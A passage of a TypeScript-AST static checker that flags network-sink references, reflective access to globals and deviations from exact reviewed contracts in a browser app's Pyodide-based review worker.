  function capabilitySource(node) {
    if (ts.isIdentifier(node)) {
      if (networkCapabilities.has(node.text) || sinkAliases.has(node.text)) return node.text;
      return null;
    }
    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      for (const name of resolvedMemberNames(node)) {
        if (networkCapabilities.has(name) && !allowedFetchReference(node)) return name;
      }
    }
    return null;
  }

  function recordAlias(target, sourceNode, reportNode = target) {
    if (!ts.isIdentifier(target) || capabilitySource(sourceNode) === null) return;
    sinkAliases.add(target.text);
    report(reportNode, `network sink alias ${target.text}`);
  }

  function isRuntimeIdentifierReference(node) {
    let current = node.parent;
    while (current && !ts.isSourceFile(current)) {
      if (ts.isTypeNode(current)) return false;
      current = current.parent;
    }
    const parent = node.parent;
    if (ts.isPropertyAccessExpression(parent) && parent.name === node) return false;
    if (
      ts.isNamedDeclaration(parent)
      && parent.name === node
      && !ts.isShorthandPropertyAssignment(parent)
    ) return false;
    return true;
  }

  function isCapabilityIdentifierReference(node) {
    return networkCapabilities.has(node.text) && isRuntimeIdentifierReference(node);
  }

  function allowedObjectReference(node) {
    const member = node.parent;
    if (
      !(ts.isPropertyAccessExpression(member) || ts.isElementAccessExpression(member))
      || member.expression !== node
    ) return false;
    const call = member.parent;
    if (!ts.isCallExpression(call) || call.expression !== member) return false;
    const name = memberName(member);
    if (["entries", "freeze", "fromEntries", "is", "keys", "values"].includes(name ?? "")) return true;
    return engineWorker
      && name === "defineProperty"
      && enclosingFunctionName(call) === "guardProperty"
      && call.arguments.length >= 2
      && ts.isIdentifier(call.arguments[0])
      && call.arguments[0].text === "owner"
      && ts.isIdentifier(call.arguments[1])
      && call.arguments[1].text === "name";
  }

  function enclosingCallable(node) {
    let current = node.parent;
    while (current) {
      if (ts.isFunctionLike(current)) return current;
      current = current.parent;
    }
    return null;
  }

  function reviewedFindingsClientPostMessage(node) {
    if (
      relativeName !== "lib/findings-sync-client.ts"
      || !ts.isCallExpression(node)
      || node.expression.getText(parsed) !== "worker.postMessage"
      || node.arguments.length !== 2
      || !ts.isIdentifier(node.arguments[0])
      || node.arguments[0].text !== "message"
      || !ts.isArrayLiteralExpression(node.arguments[1])
      || node.arguments[1].elements.length !== 1
      || node.arguments[1].elements[0].getText(parsed) !== "namespaceBuffer"
    ) return false;
    const callable = enclosingCallable(node);
    if (!callable || !ts.isMethodDeclaration(callable) || callable.name.getText(parsed) !== "#begin") {
      return false;
    }
    const messageObjects = [];
    function inspect(current) {
      if (
        ts.isVariableDeclaration(current)
        && ts.isIdentifier(current.name)
        && current.name.text === "message"
        && ts.isObjectLiteralExpression(current.initializer)
      ) messageObjects.push(current.initializer);
      ts.forEachChild(current, inspect);
    }
    inspect(callable);
    if (messageObjects.length !== 1 || messageObjects[0].properties.length !== 6) return false;
    const messageObject = messageObjects[0];
    const expected = new Map([
      ["type", '"project_findings"'],
      ["protocol_version", "WORKER_PROTOCOL_VERSION"],
      ["request_id", "requestId"],
      ["review_json", "pending.reviewJson"],
      ["project_ref", "pending.projectRef"],
      ["namespace_key", "namespaceBuffer"],
    ]);
    for (const property of messageObject.properties) {
      if (!ts.isPropertyAssignment(property)) return false;
      const name = ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name)
        ? property.name.text
        : null;
      if (name === null || property.initializer.getText(parsed) !== expected.get(name)) return false;
      expected.delete(name);
    }
    return expected.size === 0;
  }

  function reviewedWorkerPostMessage(node) {
    return relativeName === "workers/heel-review.worker.ts"
      && ts.isCallExpression(node)
      && node.expression.getText(parsed) === "scope.postMessage"
      && node.arguments.length === 1
      && node.arguments[0].getText(parsed) === "JSON.stringify(value)"
      && enclosingFunctionName(node) === "send";
  }

  function isReflectiveRootReference(node) {
    if (!isRuntimeIdentifierReference(node)) return false;
    if (node.text === "Reflect") return true;
    return node.text === "Object" && !allowedObjectReference(node);
  }

  function reflectiveMethodAuthority(node) {
    const root = rootName(node);
    const name = memberName(node);
    if (
      root === "Reflect"
      && ["apply", "construct", "get", "getOwnPropertyDescriptor"].includes(name ?? "")
    ) return name;
    if (
      root === "Object"
      && ["getOwnPropertyDescriptor", "getOwnPropertyDescriptors"].includes(name ?? "")
    ) return name;
    if (["__lookupGetter__", "__lookupSetter__"].includes(name ?? "")) return name;
    if (ambientRoots.has(root ?? "") && ["Object", "Reflect"].includes(name ?? "")) return name;
    return null;
  }

  function initializerDeclaration(node) {
    let current = node.parent;
    while (
      ts.isAsExpression(current)
      || ts.isTypeAssertionExpression(current)
      || ts.isParenthesizedExpression(current)
      || ts.isNonNullExpression(current)
      || ts.isSatisfiesExpression(current)
    ) current = current.parent;
    return ts.isVariableDeclaration(current) ? current : null;
  }

  function isReviewedWorkerScopeDeclaration(node) {
    const declaration = initializerDeclaration(node);
    return engineWorker
      && declaration !== null
      && ts.isIdentifier(declaration.name)
      && declaration.name.text === "scope"
      && declaration.initializer?.getText(parsed) === "globalThis as unknown as DedicatedWorkerGlobalScope";
  }

  function allowedAmbientRootReference(node) {
    if (relativeName === "app/dashboard/page.tsx" && node.text === "document"
      && ts.isPropertyAccessExpression(node.parent) && node.parent.expression === node
      && ["visibilityState", "addEventListener", "removeEventListener"].includes(node.parent.name.text)) return true;
    if (
      ((["lib/local-reviews.ts", "lib/findings-sync-queue.ts"].includes(relativeName)
          && memberName(node.parent) === "indexedDB")
        || (relativeName === "lib/findings-sync-queue.ts"
          && memberName(node.parent) === "IDBKeyRange"))
      && node.text === "globalThis"
      && (ts.isPropertyAccessExpression(node.parent) || ts.isElementAccessExpression(node.parent))
      && node.parent.expression === node
    ) return true;
    return node.text === "globalThis" && isReviewedWorkerScopeDeclaration(node);
  }

  function isBootstrapBindScopeArgument(node) {
    const call = node.parent;
    if (!ts.isCallExpression(call) || !call.arguments.includes(node)) return false;
    const bind = call.expression;
    return ts.isPropertyAccessExpression(bind)
      && bind.name.text === "bind"
      && (ts.isPropertyAccessExpression(bind.expression) || ts.isElementAccessExpression(bind.expression))
      && allowedFetchReference(bind.expression);
  }

  function isGuardScopeAlias(node) {
    const declaration = initializerDeclaration(node);
    return declaration !== null
      && ts.isIdentifier(declaration.name)
      && declaration.name.text === "ambient"
      && declaration.initializer?.getText(parsed) === "scope as unknown as Record<string, unknown>"
      && enclosingFunctionName(declaration) === "guardAmbientNetwork";
  }

  function allowedWorkerScopeReference(node) {
    if (node.text === "ambient") {
      const call = node.parent;
      return ts.isCallExpression(call)
        && call.expression.getText(parsed) === "guardProperty"
        && call.arguments[0] === node
        && call.arguments.length >= 2
        && ts.isIdentifier(call.arguments[1])
        && call.arguments[1].text === "name"
        && enclosingFunctionName(call) === "guardAmbientNetwork";
    }
    if (isBootstrapBindScopeArgument(node) || isGuardScopeAlias(node)) return true;
    const member = node.parent;
    if (
      !(ts.isPropertyAccessExpression(member) || ts.isElementAccessExpression(member))
      || member.expression !== node
    ) return false;
    const name = memberName(member);
    if (name === "fetch") return allowedFetchReference(member);
    if (name === "location") return enclosingFunctionName(member) === "fetchLocal";
    if (name === "postMessage") {
      return ts.isCallExpression(member.parent)
        && member.parent.expression === member
        && enclosingFunctionName(member.parent) === "send";
    }
    if (name === "onmessage") {
      return ts.isBinaryExpression(member.parent)
        && member.parent.left === member
        && member.parent.operatorToken.kind === ts.SyntaxKind.EqualsToken;
    }
    return false;
  }

  function allowedBootstrapFetchReference(node) {
    const parent = node.parent;
    if (
      ts.isVariableDeclaration(parent)
      && parent.initializer === node
      && isReviewedFetcherDeclaration(parent)
    ) return true;
    return ts.isBinaryExpression(parent)
      && parent.left === node
      && parent.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && parent.right.kind === ts.SyntaxKind.NullKeyword
      && enclosingFunctionName(parent) === "boot";
  }

  function allowedFetcherReference(node) {
    const parent = node.parent;
    if (ts.isCallExpression(parent) && parent.expression === node) {
      return isReviewedFetcherCall(parent);
    }
    if (
      ts.isBinaryExpression(parent)
      && parent.operatorToken.kind === ts.SyntaxKind.EqualsEqualsEqualsToken
      && enclosingFunctionName(parent) === "fetchLocal"
    ) {
      const other = parent.left === node ? parent.right : parent.left;
      return other.kind === ts.SyntaxKind.NullKeyword;
    }
    return false;
  }

  function allowedFetchLocalReference(node) {
    const call = node.parent;
    if (
      !ts.isCallExpression(call)
      || call.expression !== node
      || call.questionDotToken
      || call.arguments.length !== 1
      || enclosingFunctionName(call) !== "boot"
    ) return false;
    const argument = call.arguments[0];
    return ts.isIdentifier(argument)
      && reviewedRuntimeUrlDeclaration(argument.text);
  }

  function bindingDeclaresName(name, target) {
    if (ts.isIdentifier(name)) return name.text === target;
    if (ts.isObjectBindingPattern(name) || ts.isArrayBindingPattern(name)) {
      return name.elements.some((element) => (
        ts.isBindingElement(element) && bindingDeclaresName(element.name, target)
      ));
    }
    return false;
  }

  function lexicalBindings(name) {
    const bindings = [];
    function inspect(current) {
      if (
        (ts.isVariableDeclaration(current) || ts.isParameter(current))
        && bindingDeclaresName(current.name, name)
      ) bindings.push(current);
      if (
        (ts.isFunctionDeclaration(current) || ts.isClassDeclaration(current))
        && current.name?.text === name
      ) bindings.push(current);
      if (
        (ts.isImportClause(current) || ts.isImportSpecifier(current) || ts.isNamespaceImport(current))
        && current.name?.text === name
      ) bindings.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);
    return bindings;
  }

  function reviewedRuntimeUrlDeclaration(name) {
    if (!["RUNTIME_MANIFEST_URL", "WHEEL_URL"].includes(name)) return false;
    return reviewedRuntimeConstantDeclaration(name);
  }

  function reviewedRuntimeConstantDeclaration(name) {
    const expected = new Map([
      ["RUNTIME_ROOT", `"/heel-runtime/"`],
      ["RUNTIME_MODULE_URL", `"/heel-runtime/pyodide.mjs"`],
      ["RUNTIME_MANIFEST_URL", `"/heel-runtime/runtime-manifest.json"`],
      ["WHEEL_URL", "`${RUNTIME_ROOT}${WHEEL_FILENAME}`"],
    ]);
    if (!expected.has(name)) return false;
    const declarations = lexicalBindings(name);
    if (declarations.length !== 1 || !ts.isVariableDeclaration(declarations[0])) return false;
    const declaration = declarations[0];
    const statement = declaration.parent.parent;
    if (
      !ts.isVariableDeclarationList(declaration.parent)
      || (declaration.parent.flags & ts.NodeFlags.Const) === 0
      || !ts.isVariableStatement(statement)
      || statement.parent !== parsed
    ) return false;
    return declaration.initializer?.getText(parsed) === expected.get(name);
  }

  function topLevelVariable(declaration, kind, type, initializer) {
    return ts.isVariableDeclaration(declaration)
      && ts.isIdentifier(declaration.name)
      && ts.isVariableDeclarationList(declaration.parent)
      && (declaration.parent.flags & kind) !== 0
      && ts.isVariableStatement(declaration.parent.parent)
      && declaration.parent.parent.parent === parsed
      && (type === null ? declaration.type === undefined : declaration.type?.getText(parsed) === type)
      && declaration.initializer?.getText(parsed) === initializer;
  }

  function parameterMatches(parameter, name, type) {
    return ts.isIdentifier(parameter.name)
      && parameter.name.text === name
      && parameter.type?.getText(parsed) === type
      && parameter.initializer === undefined
      && parameter.dotDotDotToken === undefined;
  }

  function reviewedFunction(declaration, name, parameters, returnType, asynchronous = false) {
    return ts.isFunctionDeclaration(declaration)
      && declaration.name?.text === name
      && declaration.parent === parsed
      && declaration.body !== undefined
      && declaration.parameters.length === parameters.length
      && declaration.parameters.every((parameter, index) => (
        parameterMatches(parameter, parameters[index][0], parameters[index][1])
      ))
      && declaration.type?.getText(parsed) === returnType
      && Boolean(declaration.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword)) === asynchronous;
  }

  function reviewedCriticalBinding(name, declaration) {
    if (["RUNTIME_ROOT", "RUNTIME_MODULE_URL", "RUNTIME_MANIFEST_URL", "WHEEL_URL"].includes(name)) {
      return reviewedRuntimeConstantDeclaration(name) && lexicalBindings(name)[0] === declaration;
    }
    if (name === "scope") {
      return topLevelVariable(
        declaration,
        ts.NodeFlags.Const,
        null,
        "globalThis as unknown as DedicatedWorkerGlobalScope",
      );
    }
    if (name === "bootstrapFetch") {
      return isReviewedBootstrapDeclaration(declaration)
        && ts.isVariableStatement(declaration.parent.parent)
        && declaration.parent.parent.parent === parsed;
    }
    if (name === "reviewEntry") {
      return topLevelVariable(declaration, ts.NodeFlags.Let, "PyodideCallable | null", "null");
    }
    if (name === "findingsEntry") {
      return topLevelVariable(declaration, ts.NodeFlags.Let, "PyodideCallable | null", "null");
    }
    if (name === "acceptingInput") {
      return topLevelVariable(declaration, ts.NodeFlags.Let, null, "false");
    }
    if (name === "fetcher") return isReviewedFetcherDeclaration(declaration);
    if (name === "fetchLocal") {
      return reviewedFunction(declaration, name, [["path", "string"]], "Promise<Response>", true);
    }
    if (name === "boot") return reviewedFunction(declaration, name, [], "Promise<void>", true);
    if (name === "guardAmbientNetwork") return reviewedFunction(declaration, name, [], "void");
    if (name === "guardDynamicPackages") {
      return reviewedFunction(declaration, name, [["pyodide", "HeelPyodideRuntime"]], "void");
    }
    if (name === "guardProperty") {
      return reviewedFunction(
        declaration,
        name,
        [["owner", "Record<string, unknown>"], ["name", "string"]],
        "void",
      );
    }
    if (name === "send") {
      return reviewedFunction(declaration, name, [["value", "Record<string, unknown>"]], "void");
    }
    return false;
  }

  function validateCriticalWorkerBindings() {
    const names = [
      "RUNTIME_ROOT", "RUNTIME_MODULE_URL", "RUNTIME_MANIFEST_URL", "WHEEL_URL",
      "acceptingInput", "boot", "bootstrapFetch", "fetchLocal", "fetcher",
      "findingsEntry", "guardAmbientNetwork", "guardDynamicPackages", "guardProperty",
      "reviewEntry", "scope", "send",
    ];
    for (const name of names) {
      const bindings = lexicalBindings(name);
      if (bindings.length !== 1 || !reviewedCriticalBinding(name, bindings[0])) {
        report(bindings[1] ?? bindings[0] ?? parsed, `critical worker binding ${name} is not unique and exact`);
      }
    }
  }

  function validateFindingsProjectionContract() {
    if (!parsed.getFullText().includes('type: "project_findings"')) return;
    const contract = [
      "function projectFindings(request: FindingsRequest): void {",
      "const namespaceKey = new Uint8Array(request.namespace_key);",
      "let ownsOperation = false;\n  try {\n    if (reviewing) {",
      "reviewing = true;\n    ownsOperation = true;",
      "namespaceKey.fill(0);",
      "if (ownsOperation) reviewing = false;",
      "new Uint8Array(event.data.namespace_key).fill(0);",
    ];
    const sourceText = parsed.getFullText();
    for (const fragment of contract) {
      if (sourceText.split(fragment).length - 1 !== 1) {
        report(parsed, `findings worker contract is missing exact ${fragment}`);
      }
    }
    const resultSends = [];
    function inspect(current) {
      if (sendMessageType(current) === "findings_result") resultSends.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);
    const result = resultSends[0];
    const expected = new Map([
      ["type", '"findings_result"'],
      ["protocol_version", "WORKER_PROTOCOL_VERSION"],
      ["request_id", "request.request_id"],
      ["request_json", "requestJson"],
    ]);
    let exactResult = resultSends.length === 1
      && ts.isCallExpression(result)
      && ts.isObjectLiteralExpression(result.arguments[0])
      && result.arguments[0].properties.length === expected.size;
    if (exactResult) {
      for (const property of result.arguments[0].properties) {
        const name = ts.isPropertyAssignment(property)
          && (ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name))
          ? property.name.text
          : null;
        if (name === null || property.initializer.getText(parsed) !== expected.get(name)) {
          exactResult = false;
          break;
        }
        expected.delete(name);
      }
    }
    if (!exactResult || expected.size !== 0) {
      report(result ?? parsed, "findings worker result disclosure is not exact");
    }
  }

  function allowedBootReference(node) {
    const call = node.parent;
    if (
      !ts.isCallExpression(call)
      || call.expression !== node
      || call.questionDotToken
      || call.arguments.length !== 0
      || !ts.isVoidExpression(call.parent)
      || !ts.isExpressionStatement(call.parent.parent)
      || call.parent.parent.parent !== parsed
    ) return false;
    const statement = call.parent.parent;
    return parsed.statements.at(-1) === statement;
  }

  function isDynamicImportCall(node) {
    return ts.isCallExpression(node) && node.expression.kind === ts.SyntaxKind.ImportKeyword;
  }

  function allowedDynamicImport(node) {
    return engineWorker
      && isDynamicImportCall(node)
      && node.arguments.length === 1
      && ts.isIdentifier(node.arguments[0])
      && node.arguments[0].text === "RUNTIME_MODULE_URL"
      && reviewedRuntimeConstantDeclaration("RUNTIME_MODULE_URL")
      && enclosingFunctionName(node) === "boot"
      && ts.isAwaitExpression(node.parent)
      && node.getText(parsed) === "import(/* @vite-ignore */ RUNTIME_MODULE_URL)";
  }

  function validateDynamicImportContract() {
    const imports = [];
    function inspect(current) {
      if (isDynamicImportCall(current)) imports.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);
    if (imports.length !== 1 || !allowedDynamicImport(imports[0])) {
      report(imports[1] ?? imports[0] ?? parsed, "dynamic import authority contract is not exact");
    }
  }

  function exactBootstrapRevocation(statement) {
    if (!ts.isExpressionStatement(statement) || !ts.isBinaryExpression(statement.expression)) return false;
    const expression = statement.expression;
    return expression.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isIdentifier(expression.left)
      && expression.left.text === "bootstrapFetch"
      && expression.right.kind === ts.SyntaxKind.NullKeyword;
  }

  function exactBooleanAssignment(statement, name, value) {
    if (!ts.isExpressionStatement(statement) || !ts.isBinaryExpression(statement.expression)) return false;
    const expression = statement.expression;
    return expression.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isIdentifier(expression.left)
      && expression.left.text === name
      && expression.right.kind === (value ? ts.SyntaxKind.TrueKeyword : ts.SyntaxKind.FalseKeyword);
  }

  function booleanAssignmentValue(node, name) {
    if (
      !ts.isBinaryExpression(node)
      || !ts.isAssignmentOperator(node.operatorToken.kind)
    ) return null;
    let targetsName = false;
    function inspectTarget(current) {
      if (ts.isIdentifier(current) && current.text === name) targetsName = true;
      else if (!targetsName) ts.forEachChild(current, inspectTarget);
    }
    inspectTarget(node.left);
    if (!targetsName) return null;
    if (
      node.operatorToken.kind === ts.SyntaxKind.EqualsToken
      && ts.isIdentifier(node.left)
      && node.left.text === name
    ) {
      if (node.right.kind === ts.SyntaxKind.TrueKeyword) return true;
      if (node.right.kind === ts.SyntaxKind.FalseKeyword) return false;
    }
    return "other";
  }

  function directCallStatement(statement, name) {
    return ts.isExpressionStatement(statement)
      && ts.isCallExpression(statement.expression)
      && !statement.expression.questionDotToken
      && ts.isIdentifier(statement.expression.expression)
      && statement.expression.expression.text === name;
  }

  function sendMessageType(node) {
    if (
      !ts.isCallExpression(node)
      || node.questionDotToken
      || !ts.isIdentifier(node.expression)
      || node.expression.text !== "send"
      || node.arguments.length !== 1
      || !ts.isObjectLiteralExpression(node.arguments[0])
    ) return null;
    const typeProperty = node.arguments[0].properties.find((property) => (
      ts.isPropertyAssignment(property)
      && (ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name))
      && property.name.text === "type"
    ));
    return typeProperty
      && ts.isPropertyAssignment(typeProperty)
      && ts.isStringLiteralLike(typeProperty.initializer)
      ? typeProperty.initializer.text
      : null;
  }

  function directSendStatement(statement, type) {
    if (
      !ts.isExpressionStatement(statement)
      || sendMessageType(statement.expression) !== type
      || !ts.isCallExpression(statement.expression)
      || !ts.isObjectLiteralExpression(statement.expression.arguments[0])
    ) return false;
    const payload = statement.expression.arguments[0];
    const expected = type === "ready"
      ? new Map([
        ["type", `"ready"`],
        ["protocol_version", "WORKER_PROTOCOL_VERSION"],
      ])
      : new Map([
        ["type", `"fatal"`],
        ["protocol_version", "WORKER_PROTOCOL_VERSION"],
        ["code", `"engine_unavailable"`],
        ["message", "PUBLIC_ERRORS.engine_unavailable"],
      ]);
    if (payload.properties.length !== expected.size) return false;
    for (const property of payload.properties) {
      if (
        !ts.isPropertyAssignment(property)
        || !(ts.isIdentifier(property.name) || ts.isStringLiteralLike(property.name))
        || property.initializer.getText(parsed) !== expected.get(property.name.text)
      ) return false;
    }
    return true;
  }

  function validateBootstrapRevocationContract() {
    const bootFunctions = [];
    const bootstrapDeclarations = [];
    const allRevocations = [];
    const bootReferences = [];
    function inspect(current) {
      if (ts.isFunctionDeclaration(current) && current.name?.text === "boot") {
        bootFunctions.push(current);
      }
      if (
        ts.isVariableDeclaration(current)
        && ts.isIdentifier(current.name)
        && current.name.text === "bootstrapFetch"
      ) bootstrapDeclarations.push(current);
      if (ts.isExpressionStatement(current) && exactBootstrapRevocation(current)) {
        allRevocations.push(current);
      }
      if (
        ts.isIdentifier(current)
        && current.text === "boot"
        && isRuntimeIdentifierReference(current)
      ) bootReferences.push(current);
      ts.forEachChild(current, inspect);
    }
    inspect(parsed);

    const runtimeUrlsValid = ["RUNTIME_MANIFEST_URL", "WHEEL_URL"]
      .every(reviewedRuntimeUrlDeclaration);
    if (!runtimeUrlsValid) report(parsed, "runtime URL constant binding is not unique and exact");

    const boot = bootFunctions[0];
    const exactBootDeclaration = bootFunctions.length === 1
      && boot?.body
      && boot.parameters.length === 0
      && boot.modifiers?.some((modifier) => modifier.kind === ts.SyntaxKind.AsyncKeyword)
      && boot.type?.getText(parsed) === "Promise<void>";
    const bootAuthorityValid = exactBootDeclaration
      && bootReferences.length === 1
      && allowedBootReference(bootReferences[0]);
    if (!bootAuthorityValid) report(boot ?? parsed, "boot authority reference contract is not exact");

    let revocationValid = bootstrapDeclarations.length === 1
      && isReviewedBootstrapDeclaration(bootstrapDeclarations[0])
      && exactBootDeclaration
      && allRevocations.length === 2;
    let readinessValid = exactBootDeclaration;
    const tryStatements = boot?.body?.statements.filter(ts.isTryStatement) ?? [];
    if (
      boot?.body?.statements.length !== 1
      || tryStatements.length !== 1
      || tryStatements[0].finallyBlock
      || !tryStatements[0].catchClause
    ) {
      revocationValid = false;
      readinessValid = false;
    } else {
      const reviewedTry = tryStatements[0];
      const success = [...reviewedTry.tryBlock.statements];
      const failure = [...reviewedTry.catchClause.block.statements];
      const successRevoke = success.findIndex(exactBootstrapRevocation);
      const failureRevoke = failure.findIndex(exactBootstrapRevocation);
      const guardNetwork = success.findIndex((statement) => directCallStatement(statement, "guardAmbientNetwork"));
      const ready = success.findIndex((statement) => exactBooleanAssignment(statement, "acceptingInput", true));
      const readySend = success.findIndex((statement) => directSendStatement(statement, "ready"));
      const failed = failure.findIndex((statement) => exactBooleanAssignment(statement, "acceptingInput", false));
      const fatalSend = failure.findIndex((statement) => directSendStatement(statement, "fatal"));
      const acceptingAssignments = [];
      const readySends = [];
      const abruptExits = [];
      const fetchLocalReferences = [];
      const guardNetworkCalls = [];
      function inspectBoot(current) {
        if (ts.isBinaryExpression(current)) {
          const value = booleanAssignmentValue(current, "acceptingInput");
          if (value !== null) acceptingAssignments.push([current, value]);
        }
        if (ts.isCallExpression(current)) {
          if (sendMessageType(current) === "ready") readySends.push(current);
          if (ts.isIdentifier(current.expression) && current.expression.text === "guardAmbientNetwork") {
            guardNetworkCalls.push(current);
          }
        }
        if (
          ts.isReturnStatement(current)
          || ts.isBreakStatement(current)
          || ts.isContinueStatement(current)
        ) abruptExits.push(current);
        if (
          ts.isIdentifier(current)
          && current.text === "fetchLocal"
          && isRuntimeIdentifierReference(current)
        ) fetchLocalReferences.push(current);
        ts.forEachChild(current, inspectBoot);
      }
      inspectBoot(boot.body);
      const fetchArguments = fetchLocalReferences.map((reference) => (
        ts.isCallExpression(reference.parent)
        && reference.parent.expression === reference
        && reference.parent.arguments.length === 1
        && ts.isIdentifier(reference.parent.arguments[0])
          ? reference.parent.arguments[0].text
          : null
      ));
      revocationValid &&= runtimeUrlsValid
        && success.filter(exactBootstrapRevocation).length === 1
        && failure.filter(exactBootstrapRevocation).length === 1
        && fetchLocalReferences.length === 2
        && fetchLocalReferences.every(allowedFetchLocalReference)
        && fetchArguments.filter((name) => name === "RUNTIME_MANIFEST_URL").length === 1
        && fetchArguments.filter((name) => name === "WHEEL_URL").length === 1
        && guardNetworkCalls.length === 1
        && guardNetwork >= 0
        && successRevoke === guardNetwork + 1
        && failed >= 0
        && failureRevoke === failed + 1
        && fatalSend === failureRevoke + 1;
      readinessValid &&= acceptingAssignments.length === 2
        && acceptingAssignments.filter(([, value]) => value === true).length === 1
        && acceptingAssignments.filter(([, value]) => value === false).length === 1
        && readySends.length === 1
        && abruptExits.length === 0
        && ready === successRevoke + 1
        && readySend === ready + 1;
    }
    if (!revocationValid) report(boot ?? parsed, "bootstrap fetch revocation contract is not exact");
    if (!readinessValid) report(boot ?? parsed, "boot readiness contract is not exact");
  }

  function containsAmbientReference(node) {
    let found = false;
    function inspect(current) {
      if (ts.isIdentifier(current) && ambientRoots.has(current.text)) {
        found = true;
        return;
      }
      if (!found) ts.forEachChild(current, inspect);
    }
    inspect(node);
    return found;
  }

  function networkNameWithin(node) {
    let found = null;
    function inspect(current) {
      for (const value of resolvedConstantStrings(current)) {
        if (networkCapabilities.has(value)) {
          found = value;
          return;
        }
      }
      if (found === null) ts.forEachChild(current, inspect);
    }
    inspect(node);
    return found;
  }

  function reflectiveNetworkLookup(node) {
    const expression = node.expression;
    const root = rootName(expression);
    const name = memberName(expression);
    const text = expression.getText(parsed);
    const reflective = (
      root === "Reflect"
      && ["get", "apply", "construct", "getOwnPropertyDescriptor"].includes(name ?? "")
    ) || (
      root === "Object"
      && ["getOwnPropertyDescriptor", "getOwnPropertyDescriptors"].includes(name ?? "")
    ) || (
      ["__lookupGetter__", "__lookupSetter__"].some((lookup) => text.includes(lookup))
    );
    if (!reflective || !containsAmbientReference(node)) return null;
    const networkName = networkNameWithin(node);
    if (networkName !== null) return networkName;
    return root === "Object" && name === "getOwnPropertyDescriptors" ? "ambient descriptors" : null;
  }

  function visit(node) {
    if (
      ts.isIdentifier(node)
      && isCapabilityIdentifierReference(node)
      && !(
        node.text === "fetch"
        && ts.isCallExpression(node.parent)
        && node.parent.expression === node
        && allowedFetchCall(node.parent)
      )
    ) {
      report(node, `network sink capability reference ${node.text}`);
    }
    if (ts.isIdentifier(node) && isReflectiveRootReference(node)) {
      report(node, `reflective root authority reference ${node.text}`);
    }
    if (
      ts.isIdentifier(node)
      && ambientRoots.has(node.text)
      && isRuntimeIdentifierReference(node)
      && !allowedAmbientRootReference(node)
    ) report(node, `ambient root authority reference ${node.text}`);
    if (
      engineWorker
      && ts.isIdentifier(node)
      && ["ambient", "scope"].includes(node.text)
      && isRuntimeIdentifierReference(node)
      && !allowedWorkerScopeReference(node)
    ) report(node, `worker ambient alias authority reference ${node.text}`);
    if (
      engineWorker
      && ts.isVariableDeclaration(node)
      && ts.isIdentifier(node.name)
      && node.name.text === "bootstrapFetch"
      && !isReviewedBootstrapDeclaration(node)
    ) report(node, "unreviewed bootstrap fetch authority declaration");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "bootstrapFetch"
      && isRuntimeIdentifierReference(node)
      && !allowedBootstrapFetchReference(node)
    ) report(node, "bootstrap fetch authority reference bootstrapFetch");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "fetcher"
      && isRuntimeIdentifierReference(node)
      && !allowedFetcherReference(node)
    ) report(node, "bootstrap fetch authority reference fetcher");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "fetchLocal"
      && isRuntimeIdentifierReference(node)
      && !allowedFetchLocalReference(node)
    ) report(node, "fetchLocal authority reference is not an exact reviewed boot call");
    if (
      engineWorker
      && ts.isIdentifier(node)
      && node.text === "boot"
      && isRuntimeIdentifierReference(node)
      && !allowedBootReference(node)
    ) report(node, "boot authority reference is not the terminal reviewed call");

    if (ts.isVariableDeclaration(node) && node.initializer) {
      if (ts.isIdentifier(node.name)) {
        recordAlias(node.name, node.initializer, node);
      } else if (ts.isObjectBindingPattern(node.name)) {
        for (const element of node.name.elements) {
          const propertyNames = bindingPropertyNames(element);
          for (const propertyName of propertyNames) {
            if (runtimeAuthorityMembers.has(propertyName)) {
              report(element, `runtime Window/document authority carrier ${propertyName}`);
            }
          }
          if (
            ts.isIdentifier(element.name)
            && [...propertyNames].some((propertyName) => networkCapabilities.has(propertyName))
          ) {
            sinkAliases.add(element.name.text);
            report(element, `network sink alias ${element.name.text}`);
          }
        }
      }
    }

    if (
      ts.isBinaryExpression(node)
      && node.operatorToken.kind === ts.SyntaxKind.EqualsToken
    ) recordAlias(node.left, node.right, node);

    if (
      ts.isExpressionStatement(node)
      && ts.isStringLiteral(node.expression)
      && node.expression.text === "use server"
    ) report(node, "server action directive in browser source");

    if (ts.isElementAccessExpression(node) && node.argumentExpression) {
      const root = rootName(node);
      if (ambientRoots.has(root) && constantString(node.argumentExpression) === null) {
        report(node, "dynamic ambient capability access");
      }
    }

    if (ts.isPropertyAccessExpression(node) || ts.isElementAccessExpression(node)) {
      const name = memberName(node);
      const names = resolvedMemberNames(node);
      const root = rootName(node);
      const reflectiveAuthority = reflectiveMethodAuthority(node);
      if (reflectiveAuthority !== null) {
        report(node, `reflective method authority reference ${reflectiveAuthority}`);
      }
      for (const resolvedName of names) {
        if (runtimeAuthorityMembers.has(resolvedName)) {
          report(node, `runtime Window/document authority carrier ${resolvedName}`);
        }
        if (networkCapabilities.has(resolvedName) && !allowedFetchReference(node)) {
          report(node, `network sink capability reference ${resolvedName}`);
        }
      }
      if (["localStorage", "sessionStorage", "caches", "CacheStorage"].includes(name ?? "")) {
        report(node, `durable/cache capability ${name}`);
      }
      if (root === "console") report(node, "console capability in customer boundary");
      if (
        root === "globalThis"
        && ((name === "indexedDB"
            && !["lib/local-reviews.ts", "lib/findings-sync-queue.ts"].includes(relativeName))
          || (name === "IDBKeyRange" && relativeName !== "lib/findings-sync-queue.ts"))
      ) {
        report(node, "IndexedDB capability outside an approved local-only store");
      }
    }

    if (ts.isCallExpression(node) || ts.isNewExpression(node)) {
      const name = memberName(node.expression);
      const names = resolvedMemberNames(node.expression);
      const root = rootName(node.expression);
      const args = [...(node.arguments ?? [])];
      if (ts.isCallExpression(node)) {
        if (isDynamicImportCall(node) && !allowedDynamicImport(node)) {
          report(node, "dynamic import authority is not the reviewed boot import");
        }
        const reflected = reflectiveNetworkLookup(node);
